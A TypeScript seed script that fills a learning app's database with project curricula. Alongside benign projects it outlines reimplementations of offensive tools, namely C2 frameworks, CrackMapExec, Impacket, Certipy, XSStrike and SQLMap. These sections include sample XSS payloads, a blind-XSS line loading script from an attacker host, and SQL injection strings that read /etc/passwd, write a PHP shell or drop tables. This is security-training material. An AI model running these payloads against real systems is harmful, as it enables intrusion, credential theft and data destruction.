import Database from 'better-sqlite3';

const db = new Database('data/quest-log.db');

const insertModule = db.prepare(
	'INSERT INTO modules (path_id, name, description, order_index, created_at) VALUES (?, ?, ?, ?, ?)'
);
const insertTask = db.prepare(
	'INSERT INTO tasks (module_id, title, description, details, order_index, created_at) VALUES (?, ?, ?, ?, ?, ?)'
);
const deleteModules = db.prepare('DELETE FROM modules WHERE path_id = ?');

const now = Date.now();

function addModuleWithTasks(pathId: number, moduleName: string, moduleDesc: string, orderIndex: number, tasks: [string, string, string][]) {
	const mod = insertModule.run(pathId, moduleName, moduleDesc, orderIndex, now);
	tasks.forEach(([title, desc, details], i) => {
		insertTask.run(mod.lastInsertRowid, title, desc, details, i, now);
	});
}

function expandPath(pathId: number, modules: { name: string; desc: string; tasks: [string, string, string][] }[]) {
	deleteModules.run(pathId);
	modules.forEach((mod, i) => {
		addModuleWithTasks(pathId, mod.name, mod.desc, i, mod.tasks);
	});
}

// Get paths needing tasks
const paths = db.prepare(`SELECT id, name FROM paths`).all() as { id: number; name: string }[];
const getPath = (partial: string) => paths.find(p => p.name.includes(partial));

// ============================================================================
// Git Repository Analyzer (35)
// ============================================================================
const gitAnalyzer = getPath('Git Repository Analyzer');
if (gitAnalyzer) {
	expandPath(gitAnalyzer.id, [
		{ name: 'Week 1-2: Git Internals', desc: 'Parse .git directory', tasks: [
			['Parse git objects', 'Read blob, tree, commit objects', '## Git Objects\n\nTypes:\n- blob: file content\n- tree: directory listing\n- commit: snapshot + metadata\n- tag: named reference\n\nAll stored in .git/objects as zlib-compressed data'],
			['Implement object decompression', 'Decompress git objects', '## Decompression\n\n```python\nimport zlib\nwith open(".git/objects/ab/cd...", "rb") as f:\n    data = zlib.decompress(f.read())\n```'],
			['Parse commit objects', 'Extract commit metadata', '## Commit Format\n\n```\ntree <sha>\nparent <sha>\nauthor Name <email> timestamp\ncommitter Name <email> timestamp\n\nCommit message\n```'],
			['Build commit graph', 'Traverse history', '## Commit Graph\n\nStart from HEAD\nFollow parent references\nBuild DAG of all commits'],
			['Parse tree objects', 'List directory contents', '## Tree Format\n\n```\nmode name\\0sha (20 bytes)\nmode name\\0sha (20 bytes)\n...\n```'],
			['Implement ref resolution', 'HEAD, branches, tags', '## References\n\n.git/HEAD -> ref: refs/heads/main\n.git/refs/heads/main -> commit sha\n.git/refs/tags/* -> tag objects'],
		]},
		{ name: 'Week 3-4: Analysis Features', desc: 'Code analysis tools', tasks: [
			['Count lines by author', 'git blame analysis', '## Author Stats\n\nFor each file:\n- Parse blame\n- Count lines per author\n- Aggregate across repo'],
			['Track file changes over time', 'File history', '## File History\n\nWalk commits\nTrack renames (similarity detection)\nBuild timeline'],
			['Detect code churn', 'Frequently changed files', '## Churn Detection\n\nCount changes per file\nIdentify hotspots\nCorrelate with bug fixes'],
			['Analyze commit patterns', 'Time and frequency', '## Patterns\n\n- Commits by day/hour\n- Author activity\n- Commit size distribution'],
			['Build language statistics', 'Lines per language', '## Language Detection\n\nDetect by extension\nCount lines per language\nExclude generated/vendor'],
			['Generate contribution graph', 'Visualize activity', '## Contribution Graph\n\nDaily/weekly activity\nHeatmap visualization\nStreak tracking'],
		]},
	]);
}

// ============================================================================
// Concurrent File Sync Tool (36)
// ============================================================================
const fileSync = getPath('Concurrent File Sync');
if (fileSync) {
	expandPath(fileSync.id, [
		{ name: 'Week 1-2: File Watching', desc: 'Monitor file changes', tasks: [
			['Implement file watcher', 'Detect file changes', '## File Watching\n\nUse fsnotify (Go) or watchdog (Python)\nEvents: create, modify, delete, rename'],
			['Build recursive directory walker', 'Scan all files', '## Directory Walk\n\n```go\nfilepath.Walk(root, func(path string, info os.FileInfo, err error) error {\n    // process file\n})\n```'],
			['Calculate file checksums', 'MD5/SHA for comparison', '## Checksums\n\nHash file content\nDetect changes without full compare\nStore in metadata'],
			['Track file metadata', 'Size, mtime, permissions', '## Metadata\n\nStore:\n- Path\n- Size\n- Modified time\n- Checksum\n- Permissions'],
			['Implement change detection', 'Diff local vs remote', '## Change Detection\n\nCompare metadata databases\nIdentify: new, modified, deleted\nHandle conflicts'],
			['Build file index database', 'SQLite for state', '## Index Database\n\n```sql\nCREATE TABLE files (\n  path TEXT PRIMARY KEY,\n  checksum TEXT,\n  size INTEGER,\n  mtime INTEGER\n);\n```'],
		]},
		{ name: 'Week 3-4: Sync Engine', desc: 'Transfer and sync files', tasks: [
			['Implement delta sync', 'Only transfer changes', '## Delta Sync\n\nrsync algorithm:\n- Split file into chunks\n- Hash each chunk\n- Send only changed chunks'],
			['Build concurrent uploader', 'Parallel transfers', '## Concurrent Upload\n\n```go\nsem := make(chan struct{}, maxConcurrent)\nfor _, file := range files {\n    sem <- struct{}{}\n    go func() { upload(file); <-sem }()\n}\n```'],
			['Add conflict resolution', 'Handle simultaneous edits', '## Conflicts\n\nStrategies:\n- Newest wins\n- Keep both (rename)\n- Manual resolution'],
			['Implement bandwidth limiting', 'Throttle transfers', '## Rate Limiting\n\nToken bucket algorithm\nConfigurable max bandwidth\nFair sharing between files'],
			['Build resume support', 'Continue interrupted transfers', '## Resume\n\nTrack bytes transferred\nStore in temp file\nResume from last position'],
			['Add compression', 'Compress before transfer', '## Compression\n\nCompress files before send\nDecompress on receive\nSkip already compressed (jpg, zip)'],
		]},
	]);
}

// ============================================================================
// HTTP Proxy with Caching (37)
// ============================================================================
const httpProxy = getPath('HTTP Proxy with Caching');
if (httpProxy) {
	expandPath(httpProxy.id, [
		{ name: 'Week 1-2: Proxy Core', desc: 'Forward HTTP requests', tasks: [
			['Build HTTP request parser', 'Parse incoming requests', '## HTTP Parsing\n\n```\nGET /path HTTP/1.1\\r\\n\nHost: example.com\\r\\n\n\\r\\n\n```\n\nParse method, path, headers'],
			['Implement request forwarding', 'Send to origin', '## Forwarding\n\n1. Parse client request\n2. Connect to origin server\n3. Send request\n4. Stream response back'],
			['Handle CONNECT for HTTPS', 'TCP tunneling', '## CONNECT Method\n\n1. Client sends CONNECT host:443\n2. Connect to target\n3. Send 200 Connection Established\n4. Blind forward both directions'],
			['Add connection pooling', 'Reuse connections', '## Connection Pool\n\nKeep connections to origins alive\nReuse for subsequent requests\nTimeout idle connections'],
			['Implement chunked transfer', 'Handle streaming responses', '## Chunked Encoding\n\n```\nsize\\r\\n\ndata\\r\\n\nsize\\r\\n\ndata\\r\\n\n0\\r\\n\n\\r\\n\n```'],
			['Build header manipulation', 'Modify requests/responses', '## Header Handling\n\nAdd: X-Forwarded-For\nRemove: hop-by-hop headers\nModify: Host header'],
		]},
		{ name: 'Week 3-4: Caching Layer', desc: 'Cache responses', tasks: [
			['Implement cache storage', 'Store responses', '## Cache Storage\n\nKey: method + URL + Vary headers\nValue: response + metadata\nStorage: memory + disk'],
			['Parse Cache-Control headers', 'Respect directives', '## Cache-Control\n\n- max-age: cache duration\n- no-cache: revalidate always\n- no-store: never cache\n- private: user-specific'],
			['Build cache validation', 'ETag and Last-Modified', '## Validation\n\nIf-None-Match: etag value\nIf-Modified-Since: date\n\n304 Not Modified if unchanged'],
			['Add cache eviction', 'LRU when full', '## Eviction\n\nLRU (Least Recently Used)\nTrack access time\nEvict oldest when capacity reached'],
			['Implement cache warming', 'Pre-populate cache', '## Cache Warming\n\nPre-fetch common resources\nPeriodic refresh\nBackground updates'],
			['Build cache statistics', 'Hit/miss metrics', '## Statistics\n\n- Hit rate\n- Miss rate\n- Bytes saved\n- Average latency'],
		]},
	]);
}

// ============================================================================
// Log Aggregator & Analyzer (34)
// ============================================================================
const logAgg = getPath('Log Aggregator');
if (logAgg) {
	expandPath(logAgg.id, [
		{ name: 'Week 1-2: Log Collection', desc: 'Ingest logs from sources', tasks: [
			['Build log file tailer', 'Watch and read new lines', '## File Tailing\n\n```go\nfor {\n    line, err := reader.ReadString(\'\\n\')\n    if err == io.EOF {\n        time.Sleep(100 * time.Millisecond)\n        continue\n    }\n    process(line)\n}\n```'],
			['Implement syslog receiver', 'Accept syslog UDP/TCP', '## Syslog\n\nUDP port 514\nParse syslog format:\n<priority>timestamp host app: message'],
			['Add HTTP log endpoint', 'REST API for logs', '## HTTP Ingest\n\nPOST /logs\n- JSON body\n- Bulk support\n- Authentication'],
			['Build log parser', 'Extract structured fields', '## Parsing\n\nPatterns:\n- Apache/Nginx access logs\n- JSON logs\n- Custom regex patterns'],
			['Implement buffering', 'Handle bursts', '## Buffering\n\nIn-memory buffer\nDisk spillover when full\nBackpressure to sources'],
			['Add source tagging', 'Track log origin', '## Metadata\n\nAdd fields:\n- source: hostname/file\n- timestamp: ingestion time\n- tags: user-defined'],
		]},
		{ name: 'Week 3-4: Storage & Query', desc: 'Store and search logs', tasks: [
			['Design storage schema', 'Time-series optimized', '## Storage\n\nPartition by time\nIndex key fields\nCompress old data'],
			['Implement full-text search', 'Search log content', '## Search\n\nInverted index for fast search\nSupport wildcards, phrases\nFilter by time range'],
			['Build query language', 'Filter and aggregate', '## Query Language\n\nsource:nginx AND status:500\n| stats count by path\n| sort -count\n| head 10'],
			['Add aggregations', 'Count, sum, avg', '## Aggregations\n\n- Count events\n- Sum numeric fields\n- Average response time\n- Percentiles'],
			['Implement alerting', 'Notify on patterns', '## Alerts\n\nDefine conditions:\n- Count > threshold\n- Pattern match\n- Anomaly detection\n\nActions: email, webhook, slack'],
			['Build dashboard', 'Visualize logs', '## Dashboard\n\n- Time series charts\n- Top N tables\n- Log stream view\n- Search interface'],
		]},
	]);
}

// ============================================================================
// Markdown to HTML Compiler (39)
// ============================================================================
const mdCompiler = getPath('Markdown to HTML');
if (mdCompiler) {
	expandPath(mdCompiler.id, [
		{ name: 'Week 1-2: Parser', desc: 'Parse markdown syntax', tasks: [
			['Tokenize markdown', 'Lexical analysis', '## Tokenizer\n\nTokens:\n- Heading: # ## ###\n- Emphasis: *text* **text**\n- Link: [text](url)\n- Code: `code` ```block```\n- List: - * 1.'],
			['Parse inline elements', 'Links, emphasis, code', '## Inline Parsing\n\nRecursive descent parser\nHandle nested elements\nEscape sequences'],
			['Parse block elements', 'Paragraphs, lists, headings', '## Block Parsing\n\n- Identify block type by prefix\n- Collect content lines\n- Parse inline within blocks'],
			['Handle code blocks', 'Fenced and indented', '## Code Blocks\n\n```language\ncode here\n```\n\nOr 4-space indent'],
			['Parse tables', 'GFM table syntax', '## Tables\n\n```\n| Col1 | Col2 |\n|------|------|\n| a    | b    |\n```'],
			['Build AST', 'Abstract syntax tree', '## AST\n\nTree structure:\n- Document\n  - Heading\n  - Paragraph\n    - Text\n    - Emphasis\n  - List\n    - ListItem'],
		]},
		{ name: 'Week 3-4: HTML Generation', desc: 'Generate HTML output', tasks: [
			['Implement HTML renderer', 'AST to HTML', '## Rendering\n\nVisitor pattern:\n```js\nrender(node) {\n  switch(node.type) {\n    case "heading": return `<h${node.level}>${renderChildren()}</h${node.level}>`\n  }\n}\n```'],
			['Add syntax highlighting', 'Highlight code blocks', '## Syntax Highlighting\n\nUse highlight.js or Prism\nDetect language from fence\nApply appropriate highlighting'],
			['Generate table of contents', 'Auto-generate TOC', '## Table of Contents\n\nCollect headings\nGenerate anchor links\nNested list structure'],
			['Add front matter parsing', 'YAML metadata', '## Front Matter\n\n```yaml\n---\ntitle: My Doc\nauthor: Me\n---\n```\n\nParse and expose as metadata'],
			['Implement template system', 'Wrap in HTML template', '## Templates\n\nBase HTML structure\nInject content\nInclude CSS/JS'],
			['Build CLI tool', 'Command-line interface', '## CLI\n\n```\nmdcompile input.md -o output.html\nmdcompile --watch src/ dist/\n```'],
		]},
	]);
}

// ============================================================================
// Process Monitor TUI (41)
// ============================================================================
const procMon = getPath('Process Monitor TUI');
if (procMon) {
	expandPath(procMon.id, [
		{ name: 'Week 1-2: Process Information', desc: 'Read process data', tasks: [
			['Read /proc filesystem', 'Linux process info', '## /proc Reading\n\n/proc/[pid]/stat: CPU, state\n/proc/[pid]/status: memory, UIDs\n/proc/[pid]/cmdline: command\n/proc/[pid]/fd/: open files'],
			['Calculate CPU usage', 'Per-process CPU %', '## CPU Calculation\n\nRead utime + stime from /proc/[pid]/stat\nCompare to previous sample\nDivide by elapsed time'],
			['Get memory usage', 'RSS, virtual, shared', '## Memory\n\nFrom /proc/[pid]/status:\n- VmRSS: resident memory\n- VmSize: virtual memory\n- VmShare: shared memory'],
			['List open files', 'File descriptors', '## Open Files\n\nRead /proc/[pid]/fd/\nReadlink each fd\nShow file paths, sockets, pipes'],
			['Get network connections', 'TCP/UDP sockets', '## Network\n\nParse /proc/net/tcp and /proc/net/udp\nMatch to PIDs via /proc/[pid]/fd\nShow local/remote addresses'],
			['Build process tree', 'Parent-child relationships', '## Process Tree\n\nRead ppid from stat\nBuild tree structure\nVisualize hierarchy'],
		]},
		{ name: 'Week 3-4: TUI Interface', desc: 'Terminal interface', tasks: [
			['Set up TUI framework', 'Use tview or bubbletea', '## TUI Setup\n\nGo: tview, bubbletea\nPython: textual, rich\nRust: tui-rs'],
			['Build process table', 'Sortable columns', '## Process Table\n\nColumns: PID, Name, CPU%, Mem%, User\nSortable by any column\nScrollable'],
			['Add process details view', 'Detailed info panel', '## Details View\n\nShow selected process:\n- Command line\n- Environment\n- Open files\n- Network connections'],
			['Implement search/filter', 'Find processes', '## Search\n\n/ to search\nFilter by name, user, state\nHighlight matches'],
			['Add kill functionality', 'Send signals', '## Kill Process\n\nk to kill\nSelect signal (TERM, KILL, etc.)\nConfirm dialog'],
			['Build system overview', 'CPU, memory, load', '## System Stats\n\nTotal CPU usage\nMemory usage bar\nLoad average\nUptime'],
		]},
	]);
}

// ============================================================================
// Reimplement: Sliver C2 (59)
// ============================================================================
const sliverPath = getPath('Sliver C2');
if (sliverPath) {
	expandPath(sliverPath.id, [
		{ name: 'Week 1-2: Implant Core', desc: 'Build the agent', tasks: [
			['Design implant architecture', 'Modular agent design', '## Architecture\n\nCore: command loop, comms\nModules: filesystem, process, network\nTransport: HTTP, DNS, mTLS'],
			['Implement command handler', 'Process C2 commands', '## Command Handler\n\n```go\nswitch cmd.Type {\ncase "shell": return executeShell(cmd)\ncase "upload": return uploadFile(cmd)\ncase "download": return downloadFile(cmd)\n}\n```'],
			['Build file operations', 'Upload, download, list', '## File Ops\n\n- List directory\n- Read file\n- Write file\n- Delete file\n- File info'],
			['Add process operations', 'Execute, list, kill', '## Process Ops\n\n- Execute command\n- List processes\n- Kill process\n- Get process info'],
			['Implement shell access', 'Interactive shell', '## Shell\n\nPTY allocation\nRead/write streams\nHandle Ctrl+C, resize'],
			['Add persistence mechanisms', 'Survive reboot', '## Persistence\n\n- Registry run keys (Windows)\n- Cron/systemd (Linux)\n- LaunchAgents (macOS)'],
		]},
		{ name: 'Week 3-4: C2 Server', desc: 'Build the server', tasks: [
			['Design server architecture', 'Multi-listener server', '## Server Design\n\nListeners: HTTP, HTTPS, DNS, mTLS\nDatabase: implants, tasks, loot\nAPI: gRPC for operators'],
			['Implement listener manager', 'Start/stop listeners', '## Listeners\n\n```go\nlistener := NewHTTPListener(config)\nlistener.Start()\n// Handle implant callbacks\n```'],
			['Build task queue', 'Pending commands', '## Task Queue\n\nQueue commands per implant\nDeliver on next callback\nTrack execution status'],
			['Add operator interface', 'CLI or gRPC', '## Operator Interface\n\nSelect implant\nQueue commands\nView results\nManage listeners'],
			['Implement implant generation', 'Build custom implants', '## Implant Generation\n\nEmbed config in binary\nSupport cross-compilation\nOptional obfuscation'],
			['Build pivoting support', 'Route through implants', '## Pivoting\n\nSOCKS proxy through implant\nPort forwarding\nPeer-to-peer mesh'],
		]},
		{ name: 'Week 5-6: Transport & Evasion', desc: 'Covert communications', tasks: [
			['Implement HTTP/S transport', 'Web-based C2', '## HTTP Transport\n\nMalleable profiles\nJitter and sleep\nDomain fronting support'],
			['Add DNS transport', 'DNS-based C2', '## DNS Transport\n\nEncode data in subdomains\nTXT record responses\nVery covert, very slow'],
			['Build mTLS transport', 'Mutual TLS', '## mTLS\n\nBoth sides authenticate\nPinned certificates\nRotatable keys'],
			['Implement traffic encryption', 'End-to-end encryption', '## Encryption\n\nKey exchange per session\nAES-GCM for data\nAuthenticated encryption'],
			['Add anti-analysis features', 'Sandbox evasion', '## Evasion\n\n- Sleep obfuscation\n- Unhook ntdll\n- Check for VMs/sandboxes\n- Process injection'],
			['Build artifact generation', 'Multiple formats', '## Artifacts\n\n- Executable (PE, ELF, Mach-O)\n- Shellcode\n- DLL\n- Service\n- Shared library'],
		]},
	]);
}

// ============================================================================
// Reimplement: CrackMapExec (58)
// ============================================================================
const cmePath = getPath('CrackMapExec');
if (cmePath) {
	expandPath(cmePath.id, [
		{ name: 'Week 1-2: SMB Module', desc: 'SMB enumeration and exploitation', tasks: [
			['Implement SMB client', 'Connect to SMB shares', '## SMB Connection\n\nUsing impacket:\n```python\nfrom impacket.smbconnection import SMBConnection\nconn = SMBConnection(target, target)\nconn.login(user, password)\n```'],
			['Build share enumeration', 'List SMB shares', '## Share Enum\n\nList all shares\nCheck read/write access\nIdentify interesting shares'],
			['Add user enumeration', 'List domain users', '## User Enum\n\nSAMRPC enumeration\nLDAP queries\nRID cycling'],
			['Implement pass-the-hash', 'Auth with NTLM hash', '## Pass-the-Hash\n\n```python\nconn.login(user, "", nthash=hash)\n```\n\nNo password needed'],
			['Build command execution', 'Remote code execution', '## Execution Methods\n\n- SMBExec: service creation\n- WMIExec: WMI process create\n- AtExec: scheduled task\n- PSExec: named pipe'],
			['Add credential dumping', 'Extract creds', '## Cred Dumping\n\n- SAM dump (local users)\n- LSA secrets\n- NTDS.dit (domain)\n- LSASS memory'],
		]},
		{ name: 'Week 3-4: Additional Protocols', desc: 'WinRM, LDAP, MSSQL', tasks: [
			['Implement WinRM module', 'PowerShell remoting', '## WinRM\n\nHTTP/HTTPS ports 5985/5986\nExecute PowerShell\nUpload/download files'],
			['Build LDAP module', 'AD enumeration', '## LDAP\n\n- Query users, groups, computers\n- Find Kerberoastable users\n- Find AS-REP roastable\n- ACL enumeration'],
			['Add MSSQL module', 'Database operations', '## MSSQL\n\n- Login testing\n- Command execution (xp_cmdshell)\n- Linked server abuse\n- Hash extraction'],
			['Implement SSH module', 'Linux targets', '## SSH\n\n- Password auth\n- Key auth\n- Command execution\n- Sudo checking'],
			['Build RDP module', 'RDP screenshot/check', '## RDP\n\n- Screenshot via RDP\n- NLA detection\n- BlueKeep check'],
			['Add protocol detection', 'Service identification', '## Detection\n\nProbe common ports\nIdentify services\nRoute to appropriate module'],
		]},
	]);
}

// ============================================================================
// Reimplement: Cobalt Strike C2 (78)
// ============================================================================
const csPath = getPath('Cobalt Strike');
if (csPath) {
	expandPath(csPath.id, [
		{ name: 'Week 1-2: Beacon Core', desc: 'Build the implant', tasks: [
			['Design beacon architecture', 'Sleep-callback model', '## Beacon Design\n\nSleep for interval\nWake, check for tasks\nExecute tasks\nSend results\nSleep again'],
			['Implement sleep with jitter', 'Variable sleep times', '## Jitter\n\n```c\nint sleep_time = base_sleep * (1 + (rand() % jitter) / 100.0);\n```\n\nMakes traffic less predictable'],
			['Build task execution', 'Job system', '## Jobs\n\nJob types:\n- Inline (in beacon thread)\n- Fork (new process)\n- Inject (into other process)'],
			['Add spawn and inject', 'Process injection', '## Injection\n\n1. Spawn sacrificial process\n2. Inject shellcode\n3. Execute in context of that process\n4. Return results'],
			['Implement BOF support', 'Beacon Object Files', '## BOF\n\nPosition-independent code\nLoaded and executed in beacon\nNo new process needed'],
			['Build data channels', 'Large data transfer', '## Data Channels\n\nChunk large data\nDownload: file to operator\nUpload: file to target'],
		]},
		{ name: 'Week 3-4: Team Server', desc: 'C2 server infrastructure', tasks: [
			['Design team server', 'Multi-operator support', '## Team Server\n\nMultiple operators\nShared view of beacons\nRole-based access'],
			['Implement listener manager', 'HTTP, HTTPS, DNS, SMB', '## Listeners\n\n- HTTP/S: web traffic\n- DNS: TXT/A record tunneling\n- SMB: named pipe for internal'],
			['Build malleable C2', 'Traffic customization', '## Malleable C2\n\nCustomize:\n- HTTP headers\n- URI patterns\n- Request/response format\n- Certificates'],
			['Add beacon management', 'Track all beacons', '## Beacon Tracking\n\n- Unique ID\n- Check-in times\n- Hostname, user, IP\n- Task queue'],
			['Implement artifact kit', 'Payload generation', '## Artifacts\n\n- EXE, DLL, shellcode\n- Service EXE\n- Office macros\n- HTA, PowerShell'],
			['Build event log', 'Operator activity log', '## Event Log\n\nLog all:\n- Commands issued\n- Beacons checking in\n- Output received\n- Files uploaded'],
		]},
	]);
}

// ============================================================================
// Reimplement: XSStrike (79)
// ============================================================================
const xssPath = getPath('XSStrike');
if (xssPath) {
	expandPath(xssPath.id, [
		{ name: 'Week 1-2: Scanner Core', desc: 'XSS detection engine', tasks: [
			['Build URL parameter extractor', 'Find injection points', '## Parameter Extraction\n\nFrom URLs:\n- Query string params\n- Path segments\n- Fragment identifiers'],
			['Implement form parser', 'Find form inputs', '## Form Parsing\n\nExtract:\n- Action URL\n- Method\n- Input names and types\n- Hidden fields'],
			['Add context detection', 'Where input lands', '## Contexts\n\n- HTML body\n- Attribute value\n- JavaScript string\n- JavaScript code\n- URL\n- CSS'],
			['Build payload generator', 'Context-aware payloads', '## Payloads\n\nHTML: <script>alert(1)</script>\nAttr: "><script>alert(1)</script>\nJS string: \';alert(1);//\nJS code: alert(1)'],
			['Implement reflection detector', 'Check if payload reflected', '## Reflection\n\n1. Send payload\n2. Check response\n3. Detect encoding/filtering\n4. Adjust payload'],
			['Add DOM XSS detection', 'Client-side XSS', '## DOM XSS\n\nAnalyze JavaScript:\n- Sources: location, document.URL\n- Sinks: innerHTML, eval\n- Trace data flow'],
		]},
		{ name: 'Week 3-4: Advanced Features', desc: 'Bypass and automation', tasks: [
			['Build WAF detection', 'Identify WAF', '## WAF Detection\n\nSend trigger payload\nAnalyze response (403, modified)\nFingerprint WAF type'],
			['Implement bypass techniques', 'Evade filters', '## Bypasses\n\n- Case variation: <ScRiPt>\n- Encoding: \\x3c, &#60;\n- Null bytes\n- Polyglots'],
			['Add fuzzing engine', 'Test filter gaps', '## Fuzzing\n\nTest variations:\n- Event handlers\n- Tag names\n- Encoding combinations'],
			['Build crawler', 'Discover endpoints', '## Crawler\n\nFollow links\nParse JavaScript for URLs\nHandle SPAs'],
			['Implement blind XSS', 'Out-of-band detection', '## Blind XSS\n\nPayload phones home:\n<script src="//attacker/evil.js">\n\nCallback confirms execution'],
			['Add reporting', 'Generate reports', '## Reports\n\n- Vulnerable URL\n- Parameter\n- Payload used\n- Evidence (screenshot)\n- Remediation advice'],
		]},
	]);
}

// ============================================================================
// Reimplement: Certipy (80)
// ============================================================================
const certipyPath = getPath('Certipy');
if (certipyPath) {
	expandPath(certipyPath.id, [
		{ name: 'Week 1-2: AD CS Enumeration', desc: 'Find misconfigurations', tasks: [
			['Enumerate CA servers', 'Find certificate authorities', '## CA Discovery\n\nLDAP query:\nfilter: (objectClass=pKIEnrollmentService)\nbase: CN=Configuration,DC=domain,DC=com'],
			['List certificate templates', 'Find templates', '## Template Enum\n\nQuery: CN=Certificate Templates,CN=Public Key Services\nGet permissions and settings'],
			['Check template permissions', 'Who can enroll', '## Permissions\n\nEnrollment Rights:\n- msPKI-Enrollment-Flag\n- Security descriptor\n- Who has Enroll permission'],
			['Detect ESC1 vulnerability', 'User-supplied SAN', '## ESC1\n\nTemplate allows:\n- Client auth EKU\n- CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT\n- User can enroll\n\nRequest cert for anyone!'],
			['Detect ESC4 vulnerability', 'Template ACL abuse', '## ESC4\n\nUser has write access to template\n→ Modify template to allow SAN\n→ Now ESC1'],
			['Find ESC8 vulnerability', 'NTLM relay to CA', '## ESC8\n\nWeb enrollment enabled\nNo EPA/HTTPS required\nRelay NTLM to get cert'],
		]},
		{ name: 'Week 3-4: Exploitation', desc: 'Exploit misconfigs', tasks: [
			['Implement certificate request', 'Request certs from CA', '## Request Cert\n\n1. Generate key pair\n2. Build CSR with SAN\n3. Submit to CA\n4. Receive signed cert'],
			['Build authentication with cert', 'PKINIT auth', '## PKINIT\n\nUse certificate for Kerberos:\n1. AS-REQ with cert\n2. Receive TGT\n3. Now authenticated as SAN user'],
			['Add NTLM relay attack', 'ESC8 exploitation', '## NTLM Relay\n\n1. Coerce auth (PetitPotam)\n2. Relay to CA web enrollment\n3. Request cert for victim\n4. Auth as victim'],
			['Implement shadow credentials', 'msDS-KeyCredentialLink', '## Shadow Creds\n\nAdd key to user\'s KeyCredentialLink\nAuthenticate with that key\nNo password needed'],
			['Build golden certificate', 'CA key theft', '## Golden Cert\n\nSteal CA private key\nForge any certificate\nPersistent domain access'],
			['Add account persistence', 'Maintain access', '## Persistence\n\nCerts valid for years\nRenew before expiry\nHard to detect'],
		]},
	]);
}

// ============================================================================
// Reimplement: SQLMap (74)
// ============================================================================
const sqlmapPath = getPath('SQLMap');
if (sqlmapPath) {
	expandPath(sqlmapPath.id, [
		{ name: 'Week 1-2: Detection Engine', desc: 'Find SQL injection', tasks: [
			['Build parameter extractor', 'Find injection points', '## Parameters\n\nExtract from:\n- GET query string\n- POST body\n- Cookies\n- Headers'],
			['Implement boolean-based detection', 'True/false inference', '## Boolean-Based\n\n```sql\nid=1 AND 1=1 -- (true)\nid=1 AND 1=2 -- (false)\n```\n\nCompare response differences'],
			['Add error-based detection', 'Extract via errors', '## Error-Based\n\n```sql\nid=1 AND extractvalue(1,concat(0x7e,version()))\n```\n\nData in error message'],
			['Build time-based detection', 'Blind timing', '## Time-Based\n\n```sql\nid=1; WAITFOR DELAY \'0:0:5\'\nid=1 AND SLEEP(5)\n```\n\nMeasure response time'],
			['Implement UNION detection', 'UNION-based extraction', '## UNION\n\n1. Find column count\n2. Find injectable column\n3. Extract data:\n```sql\nUNION SELECT user,pass FROM users\n```'],
			['Add stacked queries', 'Multiple statements', '## Stacked\n\n```sql\nid=1; DROP TABLE users--\n```\n\nNot always supported'],
		]},
		{ name: 'Week 3-4: Exploitation', desc: 'Extract data', tasks: [
			['Build database fingerprinting', 'Detect DBMS', '## Fingerprint\n\nMySQL: @@version\nMSSQL: @@VERSION\nPostgres: version()\nOracle: banner from v$version'],
			['Implement data extraction', 'Dump tables', '## Extraction\n\n1. List databases\n2. List tables\n3. List columns\n4. Dump data'],
			['Add file read/write', 'File operations', '## File Operations\n\nMySQL:\n- LOAD_FILE(\'/etc/passwd\')\n- INTO OUTFILE \'/var/www/shell.php\'\n\nMSSQL:\n- xp_cmdshell'],
			['Build OS command execution', 'RCE via SQL', '## Command Execution\n\nMySQL: sys_exec UDF\nMSSQL: xp_cmdshell\nPostgres: COPY FROM PROGRAM'],
			['Implement WAF bypass', 'Evade filters', '## Bypasses\n\n- Comments: UN/**/ION\n- Encoding: %55NION\n- Case: UniOn\n- Whitespace: \\t\\n'],
			['Add tamper scripts', 'Payload modification', '## Tamper Scripts\n\nModify payloads:\n- space2comment\n- base64encode\n- between\n- randomcase'],
		]},
	]);
}

// ============================================================================
// Reimplement: Impacket Suite (57)
// ============================================================================
const impacketPath = paths.find(p => p.id === 57);
if (impacketPath) {
	expandPath(impacketPath.id, [
		{ name: 'Week 1-2: Core Protocols', desc: 'SMB, MSRPC, LDAP', tasks: [
			['Implement SMB client', 'SMB2/3 protocol', '## SMB\n\nNegotiate dialect\nSession setup (NTLM/Kerberos)\nTree connect\nFile operations'],
			['Build MSRPC layer', 'DCE/RPC', '## MSRPC\n\nEndpoint mapper\nNamed pipe transport\nBind to interfaces\nCall procedures'],
			['Add LDAP client', 'Directory queries', '## LDAP\n\nBind (simple/SASL)\nSearch operations\nModify operations\nPaged results'],
			['Implement Kerberos', 'AS-REQ/TGS-REQ', '## Kerberos\n\nAS-REQ: get TGT\nTGS-REQ: get service ticket\nHandle encryption types'],
			['Build NTLM authentication', 'Challenge-response', '## NTLM\n\nType 1: negotiate\nType 2: challenge\nType 3: authenticate'],
			['Add secretsdump foundation', 'Remote registry', '## Registry\n\nRemote registry protocol\nRead SAM, SYSTEM, SECURITY\nExtract boot key'],
		]},
		{ name: 'Week 3-4: Tools', desc: 'Implement key tools', tasks: [
			['Build psexec', 'Remote execution', '## PSExec\n\n1. Upload service binary\n2. Create service via SCM\n3. Start service\n4. Capture output'],
			['Implement smbexec', 'Stealthier execution', '## SMBExec\n\nCreate service with command\nOutput to share\nNo binary uploaded'],
			['Add wmiexec', 'WMI execution', '## WMIExec\n\nWin32_Process.Create()\nOutput via share\nVery common, less detected'],
			['Build secretsdump', 'Credential extraction', '## Secretsdump\n\n- SAM hashes (local)\n- LSA secrets\n- Domain cached creds\n- NTDS.dit (DCSync)'],
			['Implement GetNPUsers', 'AS-REP roasting', '## AS-REP Roast\n\nFind users without preauth\nRequest AS-REP\nCrack offline'],
			['Add GetUserSPNs', 'Kerberoasting', '## Kerberoast\n\nFind service accounts\nRequest TGS tickets\nCrack offline'],
		]},
	]);
}

// ============================================================================
// Transformers Deep Dive (100)
// ============================================================================
const transformersPath = getPath('Transformers, LLMs');
if (transformersPath) {
	expandPath(transformersPath.id, [
		{ name: 'Week 1-2: Attention Mechanism', desc: 'Core transformer concepts', tasks: [
			['Understand self-attention', 'Query, Key, Value', '## Self-Attention\n\n```\nAttention(Q,K,V) = softmax(QK^T/√d_k)V\n```\n\nQ: what I\'m looking for\nK: what I have\nV: what I return'],
			['Implement scaled dot-product attention', 'Code attention from scratch', '## Implementation\n\n```python\ndef attention(Q, K, V):\n    d_k = K.shape[-1]\n    scores = Q @ K.T / sqrt(d_k)\n    weights = softmax(scores)\n    return weights @ V\n```'],
			['Build multi-head attention', 'Parallel attention heads', '## Multi-Head\n\nMultiple attention heads\nEach learns different patterns\nConcatenate outputs'],
